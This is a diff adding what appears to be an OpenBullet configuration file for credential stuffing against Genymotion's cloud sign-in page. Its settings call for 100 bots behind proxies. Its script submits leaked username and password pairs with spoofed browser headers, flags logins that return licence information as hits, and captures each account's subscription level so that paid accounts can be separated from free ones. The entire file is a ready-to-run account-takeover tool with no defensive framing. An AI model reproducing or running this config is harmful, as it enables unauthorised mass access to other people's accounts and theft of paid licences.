@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "Genymotion",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-31T15:37:54.6331534+02:00",
+  "AdditionalInfo": "",
+  "Author": "Itamai",
+  "Version": "1.2.6.5 [Paradox Mod]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://cloud.genymotion.com/customer/signin/" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"remember\":true}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Content-Type: application/json;charset=UTF-8" 
+  HEADER "DNT: 1" 
+  HEADER "Origin: https://www.genymotion.com" 
+  HEADER "Referer: https://www.genymotion.com/account/login/" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"license_info" 
+  KEYCHAIN Failure OR 
+    KEY "Unable to signin" 
+
+PARSE "<SOURCE>" LR "license_info\": \"" "\"," Recursive=TRUE -> CAP "Subscription" 
+
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Free - no license" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Free - no license" 
+
